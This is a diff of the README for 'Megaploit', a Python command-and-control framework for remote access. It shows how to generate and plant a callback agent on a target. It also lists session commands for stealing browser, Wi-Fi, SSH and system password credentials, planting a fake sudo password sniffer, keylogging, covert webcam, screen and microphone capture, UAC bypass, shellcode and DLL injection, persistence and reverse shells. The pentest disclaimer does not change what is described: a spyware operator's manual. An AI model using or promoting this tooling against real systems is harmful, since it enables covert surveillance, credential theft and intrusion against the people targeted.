@@ -1,9 +1,9 @@
 # Megaploit
 
-**Professional Remote Access Framework · v2.0.0**
+**Professional Remote Access Framework · v2.1.0**
 
-> **For authorised security research and penetration testing only.**
-> You must have explicit written permission before using this tool against any system.
+> **For authorised security research and penetration testing only.**  
+> You must have explicit written permission before using this tool against any system.  
 > Misuse is illegal and unethical. The authors accept no liability.
 
 ---
@@ -14,41 +14,19 @@
 2. [Architecture](#architecture)
 3. [Requirements](#requirements)
 4. [Installation](#installation)
-   - [Automated (Linux)](#automated-linux)
-   - [Manual](#manual)
 5. [Quick Start](#quick-start)
 6. [Server Console](#server-console)
    - [Global Commands](#global-commands)
    - [Session Commands](#session-commands)
    - [Options](#options)
 7. [Toolbox](#toolbox)
-   - [Installing Tools](#installing-tools)
-   - [Running Tools](#running-tools)
-   - [Supported Languages](#supported-languages)
-   - [Update Checker](#update-checker)
 8. [Plugin System](#plugin-system)
-   - [Writing a Plugin](#writing-a-plugin)
-   - [Command Kinds](#command-kinds)
-   - [Placeholders](#placeholders)
-   - [Python Plugins](#python-plugins)
-   - [Plugin CLI Commands](#plugin-cli-commands)
 9. [Agent](#agent)
-   - [Generating the Payload](#generating-the-payload)
-   - [Deploying the Agent](#deploying-the-agent)
 10. [Streaming](#streaming)
 11. [Loot](#loot)
 12. [Security Model](#security-model)
-    - [Authentication](#authentication)
-    - [Transport Encryption](#transport-encryption)
-    - [Secret Key](#secret-key)
-13. [Module Reference](#module-reference)
-    - [megaploit.core](#megaploitcore)
-    - [megaploit.server](#megaploitserver)
-    - [megaploit.agent](#megaploitagent)
-    - [megaploit.streaming](#megaploitstreaming)
-    - [megaploit.toolbox](#megaploittoolbox)
-    - [megaploit.plugins](#megaploitplugins)
-14. [Wire Protocol](#wire-protocol)
+13. [Wire Protocol](#wire-protocol)
+14. [Module Reference](#module-reference)
 15. [Directory Layout](#directory-layout)
 16. [Contributing](#contributing)
 
@@ -61,15 +39,14 @@ Megaploit is a modular, extensible C2 (Command & Control) framework written in P
 Key properties:
 
 - **Metasploit-style console** — animated banner, colour-coded prompts, spinner, tab-completion, multi-session support
-- **Multi-session** — the server handles unlimited simultaneous agent connections; `use <id>` to switch
+- **Multi-session** — unlimited simultaneous agent connections; `use <id>` to switch between them
 - **HMAC-SHA256 authentication** — every connection is challenge-response authenticated before any command runs
 - **Hardened TLS 1.2+** — optional; enforces AEAD-only cipher suites, no renegotiation, no compression, forward secrecy required
 - **Rate limiter + IP allowlist** — per-IP sliding-window rate limiter auto-bans after 5 failed attempts; optional `--allow-ip` restricts who can even attempt auth
-- **Audit log** — every connection attempt, result, and cipher suite recorded to `loot/audit.log` with UTC timestamps
-- **Toolbox** — install any GitHub tool in any language (Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++) and run it locally against victims or deploy it onto the target machine
+- **Audit log** — every connection attempt, dispatched command, and result recorded to `loot/audit.log` with UTC timestamps
+- **Toolbox** — install any GitHub tool in any language (Python, Go, Rust, Node.js, Ruby, Java, Bash, PowerShell, C/C++) and run it locally against victims or deploy it onto the target
 - **Plugin system** — community-contributed TOML files that add new commands without writing Python
 - **Live streaming** — MJPEG desktop stream (port 5000) and webcam stream (port 5001) with filters and recording
-- **Audio recording** — via `sounddevice` + `soundfile`; no system PortAudio build required
 - **Background update checker** — notifies you of updates for Megaploit itself and every installed tool
 
 ---
@@ -92,7 +69,7 @@ Megaploit-main/
 │   ├── screenshots/
 │   ├── recordings/
 │   ├── downloads/
-│   └── audit.log                ← connection audit trail (UTC timestamps)
+│   └── audit.log                ← connection + command audit trail (UTC timestamps)
 └── megaploit/
     ├── core/                    ← shared constants, protocol, crypto
     ├── server/                  ← CLI, listener, sessions, commands
@@ -117,9 +94,10 @@ The server and agent are completely separate processes. The agent connects *back
 Python packages are listed in [`requirements.txt`](requirements.txt).  
 Notable choices:
 
-- **`sounddevice` + `soundfile`** instead of PyAudio — ships bundled PortAudio binaries, no system library needed
+- **`sounddevice` + `soundfile`** — ships bundled PortAudio binaries, no system library needed
 - **`tomli`** (Python 3.10 only) — TOML parser for the plugin system; Python 3.11 uses the stdlib `tomllib`
 - **`Flask` + `Werkzeug`** — agent-side MJPEG streaming servers
+- **`cryptography`** — recommended on the agent for `browser_creds` AES-GCM decryption on Linux/macOS
 
 ---
 
@@ -173,7 +151,6 @@ python3 server.py -lh 192.168.1.10 -p 4444
 
 **Step 3 — Generate and deploy the agent**:
 
-Inside the Megaploit console:
 ```
 megaploit > set lhost 192.168.1.10
 megaploit > set port 4444
@@ -181,6 +158,7 @@ megaploit > generate
 ```
 
 Copy `agent.py` and `secret.key` to the target, then run:
+
 ```bash
 python3 agent.py
 ```
@@ -192,14 +170,12 @@ megaploit > sessions
 megaploit > use 1
 megaploit session(1) > sysinfo
 megaploit session(1) > screenshot
-megaploit session(1) > shell whoami
+megaploit session(1) > browser_creds
 ```
 
 ---
 
 ## Server Console
-
-Start the server console:
 
 ```
 python3 server.py -lh <callback-ip> -p <port> [options]
@@ -211,25 +187,22 @@ Options:
   --cert             SSL certificate file (PEM) — enables TLS 1.2+
   --key              SSL private key file (PEM) — enables TLS 1.2+
   --secret           Path to secret.key (default: secret.key)
-  --allow-ip <IP>    Allowlisted source IP (repeat for multiple).
-                     If omitted, all IPs may attempt authentication.
+  --allow-ip <IP>    Allowlisted source IP (repeat for multiple)
 ```
 
 ### Global Commands
-
-These commands are available at the top-level `megaploit >` prompt:
 
 | Command | Description |
 |---|---|
 | `sessions` | List all active sessions with ID, IP, port, and uptime |
 | `use <id>` | Enter the session interaction prompt for session `<id>` |
-| `generate [-c] [--tls]` | Patch `megaploit/agent/connection.py` with LHOST/PORT/USE_TLS; `-c` byte-compiles `agent.py`; `--tls` enables TLS in the agent |
+| `generate [-c] [--tls]` | Patch `connection.py` with LHOST/PORT/USE_TLS; `-c` byte-compiles `agent.py` |
 | `set lhost <ip>` | Set the callback IP address |
 | `set port <port>` | Set the callback port |
 | `set cert <file>` | Set the SSL certificate file |
 | `set key <file>` | Set the SSL private key file |
 | `toolbox …` | Manage and run toolbox tools (see [Toolbox](#toolbox)) |
-| `plugins …` | Manage plugins (see [Plugin CLI Commands](#plugin-cli-commands)) |
+| `plugins …` | Manage plugins (see [Plugin System](#plugin-system)) |
 | `help` / `?` | Show all global commands, options, installed tools, and loaded plugins |
 | `clear` | Clear the terminal |
 | `exit` | Gracefully shut down the listener and exit |
@@ -238,35 +211,109 @@ These commands are available at the top-level `megaploit >` prompt:
 
 These commands are available inside a session (`megaploit session(N) >`):
 
+**Core / shell**
+
 | Command | Description |
 |---|---|
-| `help` | Show all session commands |
-| `sysinfo` | OS, hostname, username, architecture, Python version, resolution, CWD |
+| `sysinfo` | OS, hostname, user, arch, Python version, CPU%, RAM, disk |
 | `shell <command>` | Execute an arbitrary shell command on the target |
-| `cd <directory>` | Change the working directory on the target |
-| `upload <local_file>` | Send a file from the operator machine to the target |
-| `download <remote_file>` | Retrieve a file from the target to `loot/downloads/` |
-| `screenshot` | Capture a PNG screenshot to `loot/screenshots/` |
+| `cd <directory>` | Change working directory on the target |
+| `upload <local_file>` | Push a local file to the target over the C2 channel |
+| `download <remote_file>` | Pull a file from the target to `loot/downloads/` |
+| `zip_download <path>` | Zip a directory/file on the target and pull the archive in one transfer |
+| `back` | Return to the global prompt without closing the session |
+| `exit` | Send exit signal to the agent and close the session |
+
+**Screen / audio**
+
+| Command | Description |
+|---|---|
+| `screenshot` | Capture a full PNG screenshot (saved with UTC timestamp + PNG metadata) |
+| `screenshot_timelapse <count> <interval>` | Take N screenshots every N seconds, zip and pull back |
+| `screenrecord <seconds>` | Record the desktop as an AVI video file |
 | `record <seconds>` | Record microphone audio (WAV) to `loot/recordings/` (max 300s) |
+| `mic_level` | Snapshot peak dB level — detect if someone is speaking |
 | `screen_stream <on\|off>` | Start/stop MJPEG desktop stream at `http://<target>:5000` |
 | `webcam <on\|off>` | Start/stop MJPEG webcam stream at `http://<target>:5001` |
+
+**Credential harvesting**
+
+| Command | Description |
+|---|---|
+| `browser_creds [cookies\|passwords\|all]` | Extract Chrome/Edge/Brave/Firefox credentials — full DPAPI+AES-256-GCM decryption |
+| `browser_history [count]` | Pull visit history from Chrome/Firefox/Edge SQLite databases |
+| `wifi_passwords` | Extract saved Wi-Fi credentials (cross-platform) |
+| `hashdump` | Dump `/etc/shadow` (Linux) or SAM+SYSTEM hive (Windows) |
+| `cred_vault` | Enumerate Windows Credential Manager via `CredEnumerateW` |
+| `ssh_harvest` | Collect SSH private keys, `known_hosts`, `authorized_keys`, and shell history |
+| `sudo_sniff [log_path]` | Plant a fake `sudo` wrapper that captures the password to a file |
+
+**Recon / awareness**
+
+| Command | Description |
+|---|---|
+| `search <path> <keyword>` | Recursive file-content grep (skips binary, caps at 200 hits) |
+| `idle_time` | Seconds since last keyboard/mouse input |
+
+**Pivoting / networking**
+
+| Command | Description |
+|---|---|
+| `portfwd <lport> <rhost> <rport>` | TCP relay from agent port to a remote host:port in a daemon thread |
+| `socks5 [port]` | Start a full SOCKS5 proxy server on the target (no-auth, IPv4/domain/IPv6) |
+| `reverse_shell <ip> <port>` | Spawn a PTY reverse shell back to a second listener |
+
+**Evasion / privilege escalation**
+
+| Command | Description |
+|---|---|
+| `lock_screen` | Silently lock the workstation (Windows/macOS/Linux) |
+| `token_steal [pid]` | Windows token impersonation via `DuplicateToken` + `ImpersonateLoggedOnUser` `[!]` |
+| `uac_bypass <command>` | fodhelper registry hijack — runs `<command>` elevated, no UAC prompt `[!]` |
+| `living_off_land <lolbin> <args>` | Execute via signed Windows LOLBins (mshta/certutil/rundll32/wmic/cscript/etc.) |
+
+**Code injection**
+
+| Command | Description |
+|---|---|
+| `inject_shellcode <pid> <hex>` | `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` shellcode injection `[!]` |
+| `dll_inject <pid> <dll_path>` | `LoadLibraryA` remote thread DLL injection `[!]` |
+
+**Keylogger**
+
+| Command | Description |
+|---|---|
 | `keylog_start` | Start the keystroke logger on the target |
 | `keylog_dump` | Read and print captured keystrokes |
 | `keylog_stop` | Stop the keylogger and delete the log file |
-| `persist <regname> <filename>` | Install Windows Run-key persistence (Windows targets only) |
-| `forkbomb` | Crash the target process tree (Unix only) — **requires YES confirmation** |
-| `toolbox_run <name> [args]` | Run an installed toolbox tool *locally* (operator side) against the session IP |
-| `toolbox_deploy <name> [args]` | Upload the tool's entry-point to the target and execute it there |
-| `back` | Return to the global prompt without closing the session |
-| `exit` | Send the exit signal to the agent and close the session |
 
-Any unrecognised input is forwarded verbatim to the agent's shell (equivalent to `shell <input>`).
+**Persistence / cleanup**
 
-Commands marked `[!]` in the help output are **dangerous** — the console will prompt for `YES` confirmation before executing.
+| Command | Description |
+|---|---|
+| `persist <regname> <filename>` | Install Windows Run-key persistence |
+| `self_destruct` | Wipe the agent binary, remove persistence, delete keylog; `os._exit(0)` `[!]` |
+| `forkbomb` | Crash the target process tree (Unix only) `[!]` |
+
+**GUI control**
+
+| Command | Description |
+|---|---|
+| `msgbox <title> <message>` | Pop a visible dialog on the target's screen |
+| `mouse_move <x> <y> [click]` | Silently move (and optionally click) the mouse |
+| `type_keys text\|hotkey <args>` | Type text or fire a hotkey combo |
+
+**Toolbox (inside a session)**
+
+| Command | Description |
+|---|---|
+| `toolbox_run <name> [args]` | Run an installed tool *locally* (operator side) against the session IP |
+| `toolbox_deploy <name> [args]` | Upload the tool to the target and execute it there |
+
+> Commands marked `[!]` are **dangerous** — the console prompts for `YES` confirmation before executing.  
+> Any unrecognised input is forwarded verbatim to the agent's shell.
 
 ### Options
-
-Run `set` with no arguments to see current options:
 
 ```
 megaploit > set
@@ -282,56 +329,21 @@ megaploit > set
 
 ## Toolbox
 
-The toolbox lets you install any public GitHub repository as a first-class Megaploit tool — regardless of what language it's written in. Tools are catalogued in `tools/tools.json` and persist across restarts.
-
-### Installing Tools
+Install any public GitHub repository as a first-class Megaploit tool — regardless of language. Tools persist in `tools/tools.json` across restarts.
 
 ```
 megaploit > toolbox install <repo_url> <name> [description] [--tags tag1,tag2]
+megaploit > toolbox list
+megaploit > toolbox info <name>
+megaploit > toolbox search <query>
+megaploit > toolbox update <name>
+megaploit > toolbox update-all
+megaploit > toolbox check-updates
+megaploit > toolbox remove <name>
+megaploit > toolbox set-entry <name> <path>
 ```
 
-Examples:
-
-```
-megaploit > toolbox install https://github.com/sqlmapproject/sqlmap sqlmap "SQL injection tool" --tags web,injection
-megaploit > toolbox install https://github.com/OJ/gobuster gobuster "Directory/DNS bruteforcer" --tags web,recon
-megaploit > toolbox install https://github.com/projectdiscovery/nuclei nuclei --tags vuln,scan
-```
-
-The installer will:
-1. Clone the repository with `git clone --depth=1`
-2. Auto-detect the language (see [Supported Languages](#supported-languages))
-3. Build/install dependencies (venv for Python, `go build` for Go, `cargo build` for Rust, etc.)
-4. Detect the entry-point
-5. Register the tool with a launch command template
-
-### Running Tools
-
-**Locally** (on the operator machine, targeting the active session's IP):
-
-```
-megaploit session(1) > toolbox_run sqlmap -u http://{session_ip}/login
-megaploit session(1) > toolbox_run gobuster dir -u http://{session_ip} -w wordlist.txt
-```
-
-**Remotely** (upload to target and execute there):
-
-```
-megaploit session(1) > toolbox_deploy sqlmap -u http://127.0.0.1/login
-```
-
-Other toolbox commands:
-
-| Command | Description |
-|---|---|
-| `toolbox list` | Show all installed tools with name, status, entry-point, description |
-| `toolbox info <name>` | Full details: language, run command, entry-point, path, tags, session usage |
-| `toolbox search <query>` | Search by name, description, language, or tag |
-| `toolbox update <name>` | `git pull` + rebuild for one tool |
-| `toolbox update-all` | Update and rebuild every installed tool |
-| `toolbox check-updates` | Force an immediate update check for all tools and Megaploit itself |
-| `toolbox remove <name>` | Delete the tool directory and remove from the catalogue |
-| `toolbox set-entry <name> <path>` | Override the auto-detected entry-point |
+**Note:** `toolbox install/list/etc.` must be typed at the global `megaploit >` prompt, not inside a session. Inside a session use `toolbox_run` or `toolbox_deploy`.
 
 ### Supported Languages
 
@@ -344,11 +356,9 @@ Other toolbox commands:
 | Ruby | `Gemfile`, `*.rb` | `bundle install` |
 | Java | `pom.xml`, `build.gradle` | `mvn package` or `gradle build` |
 | Bash | `*.sh` at root | `chmod +x` |
-| PowerShell | `*.ps1` at root | wraps with `pwsh -ExecutionPolicy Bypass -File` |
+| PowerShell | `*.ps1` at root | `pwsh -ExecutionPolicy Bypass -File` |
 | C/C++ | `CMakeLists.txt`, `Makefile` | `cmake + make` or `make` |
 | Binary | Executable with no extension | `chmod +x` |
-
-The launch command is stored in the `run_cmd` field of `tools/tools.json` and uses `{entry}` as a placeholder for the absolute entry-point path at runtime.
 
 ### Remote Deploy Strategies
 
@@ -360,34 +370,13 @@ The launch command is stored in the `run_cmd` field of `tools/tools.json` and us
 | Ruby | `entry.rb` | `ruby entry.rb` |
 | Go / Rust / C binary | compiled binary | `chmod +x && ./binary` |
 | Java | `.jar` file | `java -jar tool.jar` |
-| Node.js | `entry.js` only | `node entry.js` — **note:** `node_modules` are not uploaded; use `toolbox_run` for dep-heavy Node tools |
-
-### Update Checker
-
-A background daemon thread runs every 5 minutes and compares local and remote git HEAD hashes (using `git ls-remote origin HEAD` — read-only, no fetch). Notifications appear between prompts:
-
-```
-  [↑] Update available for sqlmap  abc1234 → def5678
-       Run:  toolbox update sqlmap
-```
-
-You can also trigger an immediate check:
-
-```
-megaploit > toolbox check-updates
-```
+| Node.js | `entry.js` only | `node entry.js` — `node_modules` not uploaded; use `toolbox_run` for dep-heavy tools |
 
 ---
 
 ## Plugin System
 
-Megaploit has a TOML-based plugin system that lets anyone extend the framework without writing Python.
-
-Drop a `.toml` file into the `plugins/` directory. It is loaded automatically on startup and is instantly available as a new CLI command. No restart needed after `plugins reload`.
-
-### Writing a Plugin
-
-A plugin file has two sections: `[plugin]` metadata and one or more `[[command]]` blocks.
+Drop a `.toml` file into `plugins/`. It loads automatically on startup and is instantly available as a new CLI command. No restart needed after `plugins reload`.
 
 ```toml
 [plugin]
@@ -411,166 +400,83 @@ description = "Print current user on the target"
 shell       = "id"
 ```
 
-Save as `plugins/recon.toml`. Run `plugins reload` (or restart). Then:
-
-```
-megaploit session(1) > portscan 80,443,8080
-megaploit session(1) > getuid
-```
-
 ### Command Kinds
 
 | `kind` | Runs on | How |
 |---|---|---|
 | `local` | Operator machine | Spawns a local subprocess; output streamed line-by-line |
-| `session` | Active agent | Sends the expanded shell string over the C2 channel; returns agent response |
+| `session` | Active agent | Sends the expanded shell string over the C2 channel |
 | `python` | Operator machine | Imports and calls a Python function by dotted path |
 
 ### Placeholders
 
-All `shell` strings (and Python handler `context` dicts) support these placeholders:
-
 | Placeholder | Value |
 |---|---|
 | `{session_ip}` | IP address of the current session |
-| `{session_id}` | Numeric ID of the current session |
-| `{lhost}` | The operator's `lhost` setting |
-| `{port}` | The operator's `port` setting |
-| `{arg0}` | First CLI argument after the command name |
-| `{arg1}` | Second CLI argument, etc. |
-
-Example — a local command that runs nmap against the target:
-
-```toml
-[[command]]
-name  = "portscan"
-kind  = "local"
-shell = "nmap -sV -p {arg0} {session_ip}"
-```
-
-Run as: `portscan 1-1000`  →  expands to: `nmap -sV -p 1-1000 192.168.1.42`
-
-### Python Plugins
-
-For advanced plugins that need full Python, set `kind = "python"` and point `handler` at a dotted `module.function` path. The function receives `(args: list[str], context: dict[str, str])` and returns a string or `None`.
-
-```toml
-[[command]]
-name     = "mycheck"
-kind     = "python"
-handler  = "plugins.my_checks.run"
-min_args = 1
-```
-
-`plugins/my_checks.py`:
-
-```python
-def run(args, context):
-    target = context.get("session_ip", args[0])
-    # ... your logic ...
-    return f"[+] Done: {target}"
-```
-
-The handler module must be importable from the project root. The simplest approach is to place it inside the `plugins/` directory and use the `plugins.mymodule.function` dotted path.
+| `{session_id}` | Numeric session ID |
+| `{lhost}` | Operator's `lhost` setting |
+| `{port}` | Operator's `port` setting |
+| `{arg0}`, `{arg1}`, … | CLI arguments after the command name |
 
 ### Plugin CLI Commands
 
 | Command | Description |
 |---|---|
-| `plugins` | List all loaded plugins and their commands |
-| `plugins list` | Same as above |
-| `plugins reload` | Re-scan `plugins/` and reload all plugins without restarting |
-| `plugins info <name>` | Show full details: author, source file, all commands with kind and description |
-
-Plugins with `dangerous = true` on a command will trigger the same YES-confirmation gate as built-in dangerous commands.
+| `plugins` / `plugins list` | List all loaded plugins and their commands |
+| `plugins reload` | Re-scan `plugins/` and reload without restarting |
+| `plugins info <name>` | Full details: author, source file, all commands |
 
 ---
 
 ## Agent
 
-The agent (`agent.py`) is the payload deployed on the target machine. It:
-1. Connects back to the server on `LHOST:PORT` (reverse shell — no inbound rule needed on the target)
+The agent (`agent.py`) is the payload deployed on the target. It:
+
+1. Connects back to the server on `LHOST:PORT` (reverse — no inbound firewall rule needed)
 2. Performs HMAC-SHA256 authentication
-3. Optionally wraps the connection in TLS 1.2+ with AEAD-only ciphers (if `USE_TLS = True`)
+3. Optionally wraps in TLS 1.2+ with AEAD-only ciphers (`USE_TLS = True`)
 4. Enters a receive-execute-respond loop
-5. Silently reconnects after disconnection with jitter: `RECONNECT_DELAY + random(0, RECONNECT_JITTER)` seconds
+5. Silently reconnects with jitter: `RECONNECT_DELAY + random(0, RECONNECT_JITTER)` seconds
 
 ### Generating the Payload
 
 ```
 megaploit > set lhost 192.168.1.10
 megaploit > set port 4444
-megaploit > generate
+megaploit > generate           # plain TCP
+megaploit > generate --tls     # with TLS (requires --cert / --key on the server)
+megaploit > generate -c        # byte-compile agent.py to .pyc
 ```
 
-This patches `megaploit/agent/connection.py` with your LHOST, PORT, and USE_TLS values.
-
-**With TLS** (requires `--cert` / `--key` on the server):
-
-```
-megaploit > generate --tls
-```
-
-**Byte-compile** (makes the `.pyc` slightly harder to read):
-
-```
-megaploit > generate -c
-```
-
-### Deploying the Agent
-
-The minimum files needed on the target:
+Minimum files needed on the target:
 
 ```
 agent.py
 secret.key
-megaploit/          ← the entire package directory
+megaploit/   ← the entire package directory
 ```
-
-Run:
-
-```bash
-python3 agent.py
-```
-
-The agent will silently retry connection every 10 seconds until the server is reachable.
 
 ---
 
 ## Streaming
 
-Two Flask MJPEG servers can be started remotely via C2 commands:
-
 ### Desktop Stream
 
 ```
 megaploit session(1) > screen_stream on
-[+] Screen stream started — http://0.0.0.0:5000
 ```
 
-Open `http://<target-ip>:5000` in a browser. The stream runs at ~30 fps using `mss` for screen capture and OpenCV for JPEG encoding.
-
-Stop with: `screen_stream off`
+Open `http://<target-ip>:5000` in a browser. ~30 fps via `mss` + OpenCV JPEG encoding.  
+Stop with `screen_stream off`.
 
 ### Webcam Stream
 
 ```
 megaploit session(1) > webcam on
-[+] Webcam started — http://0.0.0.0:5001
 ```
 
-Open `http://<target-ip>:5001` in a browser. The webcam UI provides:
-
-| Button | Effect |
-|---|---|
-| Stop / Start | Toggle the live camera feed |
-| Capture | Save a still frame to `loot/screenshots/` |
-| Greyscale | Toggle greyscale filter |
-| Negative | Toggle colour-negative filter |
-| Face Only | Crop the frame to the first detected face (requires the DNN model in `saved_model/`) |
-| Record | Toggle video recording to `loot/recordings/` (XVID AVI) |
-
-Stop with: `webcam off`
+Open `http://<target-ip>:5001`. UI buttons: Stop/Start, Capture (saves to `loot/screenshots/`), Greyscale, Negative, Face-Only (DNN), Record (AVI to `loot/recordings/`).  
+Stop with `webcam off`.
 
 ---
 
@@ -580,24 +486,24 @@ All files collected from sessions are saved under `loot/`:
 
 ```
 loot/
-├── screenshots/     ← shot_<ip>_<n>.png   (from `screenshot` and webcam Capture)
-├── recordings/      ← rec_<ip>_<n>.wav    (from `record <seconds>`)
-│                      webcam_<ts>.avi      (from webcam Record button)
-├── downloads/       ← <n>_<filename>       (from `download <file>`)
-└── audit.log        ← connection audit trail (one line per event, UTC timestamps)
+├── screenshots/    shot_<ip>_<utc-timestamp>_<n>.png    (screenshot / webcam Capture)
+├── recordings/     rec_<ip>_<utc-timestamp>_<n>.wav     (record <seconds>)
+│                   webcam_<ts>.avi                       (webcam Record button)
+├── downloads/      <n>_<filename>                        (download / zip_download)
+└── audit.log       one line per connection + command event, UTC timestamps
 ```
+
+**Screenshot files** include embedded PNG `tEXt` metadata chunks (`Source`, `CapturedAt`, `SessionId`) written by Pillow, making the capture fully self-documenting.
 
 **Audit log format:**
 
 ```
 2024-01-15 14:32:01 UTC  LISTEN    bind=0.0.0.0:4444  tls=yes  allowlist=none
-2024-01-15 14:32:18 UTC  ACCEPTED  ip=10.0.0.20       port=54321  session=1  cipher=ECDHE-RSA-AES256-GCM-SHA384
-2024-01-15 14:33:01 UTC  REJECTED  ip=192.168.1.99    port=41234  reason=auth_failed
-2024-01-15 14:33:05 UTC  BANNED    ip=192.168.1.99    attempts=6  ban_until=14:38:05
-2024-01-15 14:33:10 UTC  BLOCKED   ip=192.168.1.99    reason=banned
+2024-01-15 14:32:18 UTC  ACCEPTED  ip=10.0.0.20  port=54321  session=1  cipher=ECDHE-RSA-AES256-GCM-SHA384
+2024-01-15 14:33:01 UTC  REJECTED  ip=192.168.1.99  port=41234  reason=auth_failed
+2024-01-15 14:33:05 UTC  BANNED    ip=192.168.1.99  attempts=6  ban_until=14:38:05
+2024-01-15 14:33:10 UTC  CMD       session=1  ip=10.0.0.20  status=OK  cmd=screenshot
 ```
-
-File names include the session IP and an incrementing counter so files from multiple sessions never overwrite each other.
 
 ---
 
@@ -605,405 +511,49 @@ File names include the session IP and an incrementing counter so files from mult
 
 ### Authentication
 
-Every agent connection is authenticated before any command is accepted:
-
 1. Server sends a random 16-byte challenge
-2. Agent responds with `HMAC-SHA256(secret_key, challenge)` — a 32-byte digest
-3. Server verifies with `hmac.compare_digest()` (constant-time comparison, prevents timing attacks)
+2. Agent responds with `HMAC-SHA256(secret_key, challenge)` — 32-byte digest
+3. Server verifies with `hmac.compare_digest()` (constant-time, prevents timing attacks)
 4. Connection is dropped immediately on failure
-
-This means even if an attacker can reach your listener port, they cannot interact with the C2 without the `secret.key`.
 
 ### Transport Encryption
 
-TLS is **opt-in** but strongly recommended for any non-lab use. To enable it:
-
-1. Start the server with `--cert cert.pem --key key.pem`
-2. Run `generate --tls` to patch the agent
-
-**Enforced when TLS is active:**
-- TLS 1.2 minimum (`TLSVersion.TLSv1_2`); TLS 1.3 used automatically where available
-- AEAD-only cipher suites: `ECDHE+AESGCM`, `ECDHE+CHACHA20`, `DHE+AESGCM`, `DHE+CHACHA20`
-- No CBC, no RC4, no export ciphers, no MD5
-- No TLS renegotiation (`OP_NO_RENEGOTIATION`)
-- No protocol-level compression (`OP_NO_COMPRESSION`)
-- Forward secrecy required (ECDHE/DHE only)
-
-Without TLS the C2 channel is plain TCP. HMAC authentication still protects against unauthorised connections, but traffic is visible on the wire.
-
-Self-signed certificate generation:
+TLS is opt-in but strongly recommended for non-lab use.
 
 ```bash
+# Generate a self-signed cert:
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
   -subj "/CN=megaploit"
+
+# Start server with TLS:
+python3 server.py -lh 10.0.0.1 -p 4444 --cert cert.pem --key key.pem
+
+# Patch agent for TLS:
+megaploit > generate --tls
 ```
+
+**Enforced when TLS is active:** TLS 1.2 minimum, AEAD-only ciphers (`ECDHE+AESGCM`, `ECDHE+CHACHA20`, `DHE+AESGCM`, `DHE+CHACHA20`), no CBC/RC4/export, no renegotiation, no compression, forward secrecy required.
 
 ### Rate Limiter & IP Allowlist
 
-The listener applies two additional gates before HMAC authentication:
+**Rate limiter** (always active): 60-second sliding window per source IP. After `MAX_AUTH_ATTEMPTS_PER_MIN` (default: 5) attempts, the IP is banned for `IP_BAN_DURATION` (default: 300 s).
 
-**Rate limiter** — automatically active, no configuration needed:
-- Sliding 60-second window per source IP
-- After `MAX_AUTH_ATTEMPTS_PER_MIN` (default: 5) attempts, the IP is banned for `IP_BAN_DURATION` (default: 300 s)
-- All events written to `loot/audit.log`
-
-**IP allowlist** — opt-in via `--allow-ip`:
+**IP allowlist** (opt-in):
 ```bash
 python3 server.py -lh 10.0.0.1 -p 4444 --allow-ip 10.0.0.20 --allow-ip 10.0.0.21
 ```
-Connections from any IP not on the list are dropped before a single byte is read.
 
 ### Secret Key
 
-The shared secret key is a 32-byte random value stored as 64 hex characters in `secret.key`.
+32-byte random value stored as 64 hex chars in `secret.key`.
 
 **Never commit `secret.key` to a repository.**
-**Copy it to the target machine via a secure channel before deploying the agent.**
-
-Generate a new key:
 
 ```bash
 python3 -c "import os,binascii; open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
 ```
 
-On startup the console prints a **key fingerprint** — the first 16 hex characters of `SHA-256(key)` — so you can confirm both sides are using the same key without exposing the key itself:
-
-```
-[*] Key fingerprint : 3a7f1b2c 9e8d4a05
-```
-
-On Unix, if `secret.key` has group or world read permissions, a warning is printed:
-
-```
-[!] WARNING: 'secret.key' is readable by group/others (mode 644).
-    Fix with:  chmod 600 secret.key
-```
-
----
-
-## Module Reference
-
-### megaploit.core
-
-#### `config.py`
-
-Shared constants used by both server and agent.
-
-| Constant | Default | Description |
-|---|---|---|
-| `BUFFER_SIZE` | `4096` | Socket read buffer size (bytes) |
-| `AUTH_TIMEOUT` | `10` | Seconds before authentication times out (tight to prevent connection-holding) |
-| `RECONNECT_DELAY` | `10` | Base seconds the agent waits before reconnecting |
-| `RECONNECT_JITTER` | `5` | Random 0–5 s added to each reconnect delay (prevents thundering-herd) |
-| `MAX_AUTH_ATTEMPTS_PER_MIN` | `5` | Per-IP rate limit before auto-ban |
-| `IP_BAN_DURATION` | `300` | Seconds a rate-limited IP stays banned |
-| `END_SENTINEL` | `b"<<MEGAPLOIT_END>>"` | Message framing delimiter |
-| `SCREEN_STREAM_PORT` | `5000` | Port for the desktop MJPEG server |
-| `WEBCAM_STREAM_PORT` | `5001` | Port for the webcam MJPEG server |
-| `MAX_RECORD_SECONDS` | `300` | Maximum microphone recording length |
-| `AUDIT_LOG` | `"loot/audit.log"` | Path to the connection audit log |
-| `KEYLOG_PATH` | Platform-dependent | Hidden path for the keystroke log file |
-
-#### `crypto.py`
-
-HMAC-SHA256 authentication helpers.
-
-```python
-load_key(path="secret.key") -> bytes
-```
-Load and hex-decode the shared secret. Checks file permissions on Unix and warns if world-readable. Calls `sys.exit(1)` on failure.
-
-```python
-key_fingerprint(key: bytes) -> str
-```
-Returns the first 16 hex chars of `SHA-256(key)` — printed on startup as a human-readable identity check.
-
-```python
-server_authenticate(conn, secret_key, timeout=10) -> bool
-```
-Server side: send a 16-byte random challenge, read the 32-byte HMAC response, verify it.
-
-```python
-agent_authenticate(conn, secret_key, timeout=15) -> bool
-```
-Agent side: receive the challenge, compute and send the HMAC response.
-
-#### `protocol.py`
-
-Wire protocol functions. All messages are JSON-encoded and delimited by `END_SENTINEL`. Binary transfers stream raw bytes followed by `END_SENTINEL`.
-
-```python
-send_msg(conn, data)           # JSON-encode and send; data can be any JSON-serialisable object
-recv_msg(conn) -> object       # Block until a full JSON message is received
-send_file(conn, path)          # Stream a file to conn + sentinel
-recv_file(conn, path, timeout) # Receive a file from conn, write to path
-```
-
----
-
-### megaploit.server
-
-#### `session.py` — `Session`
-
-Dataclass representing one authenticated agent connection.
-
-| Field | Type | Description |
-|---|---|---|
-| `conn` | `socket.socket` | The connected socket |
-| `ip` | `str` | Agent IP address |
-| `port` | `int` | Agent source port |
-| `id` | `int` | Sequential session ID (assigned by `Listener`) |
-| `connected_at` | `float` | Unix timestamp of connection |
-
-Properties: `label` (`ip:port`), `uptime` (`HH:MM:SS` string).  
-Methods: `close()`, `screenshot_path()`, `recording_path()`, `download_path(remote_name)`.
-
-#### `listener.py` — `Listener`
-
